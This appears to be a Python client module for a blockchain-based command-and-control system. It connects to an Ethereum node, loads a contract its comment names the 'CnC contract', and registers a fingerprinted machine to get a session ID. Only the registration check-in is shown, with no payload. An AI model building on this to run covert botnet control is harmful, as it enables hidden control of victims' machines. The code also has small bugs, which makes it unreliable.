
import yaml
import os,time, sys
from os.path import join as opj

import yaml
from solc import compile_source
from web3 import Web3, HTTPProvider

import Client.OsInteractions as OsInteractions
from Util.EtherKeysUtil import *
from web3.utils.events import get_event_data
from web3.utils.abi import filter_by_name
from Util.SolidityTypeConversionUtil import *
REGISTRATION_EVENT_NAME = 'InstanceRegistered'
from geth import DevGethProcess

class ClientCommands:

    def __init__(self, confFile):
        self.conf = yaml.safe_load(open(opj('conf','gen', confFile)))

        # TODO: check node is up. load node if not ,wait for connection and sync.
        # connect to local node
        self.web3 = Web3(HTTPProvider(self.conf['nodeRpcUrl']))

        # load CnC contract
        self.contract = self.loadContract()
        #TODO: check contract is up, otherwise go to sleep or die

        self.walletAddress = self.conf['client']['address']

        print ("client-> wallet:",self.walletAddress, "contract:",self.contractAddress, self.abi)

    def loadContract(self):
        with (open(opj(self.conf['interfaceDir'], self.conf['contractName'] + '.interface.yaml'), 'r')) as f:
            c = (yaml.safe_load(f.read()))
            self.abi = c['abi']
            self.contractAddress = c['deployedAddress']

        contract = self.web3.eth.contract(self.abi, self.contractAddress)
        return contract


    def registered(self):
        return self.sessionId != None

    def registerInstance(self):
        self.machineId = OsInteractions.fingerprintMachine()

        currBlock = self.web3.eth.blockNumber
        filter = self.web3.eth.filter({'from': cc.walletAddress, 'fromBlock': currBlock})

        try:
            self.contract.transact({'from': self.walletAddress}).registerInstance(self.machineId)

            logs=[]
            while (not logs):
                logs = filter.get(True)
                time.sleep(0.1)
                #print ('iteration...')

            self.web3.eth.uninstallFilter(filter.filter_id)


            self.sessionId = bytesToHexString(self.getLogData(REGISTRATION_EVENT_NAME, logs)[0]['args']['sessionId'])
            print ('Successful registration! SessionId:',self.sessionId)
        except Exception as e:
            print("Error in returned log event:", e)
            self.sessionId = None

        return self.registered()


    def getLogData (self, eventName, logs) -> list:
        #eabi = [m for m in self.abi if m.get('name', '-1') == eventName]
        eabi = filter_by_name(eventName,cc.abi)
        return [get_event_data(eabi[0],log) for log in logs ] if eabi else []



if __name__ == "__main__":
    print ("base dir ",sys.argv[1])
    os.chdir(sys.argv[1])

    cc = ClientCommands('ClientConf.BASE.yaml')

    #cc.registerInstance()

    #print ("wallet:",cc.walletAddress, "sessionId", cc.sessionId, "machineId:",cc.machineId)




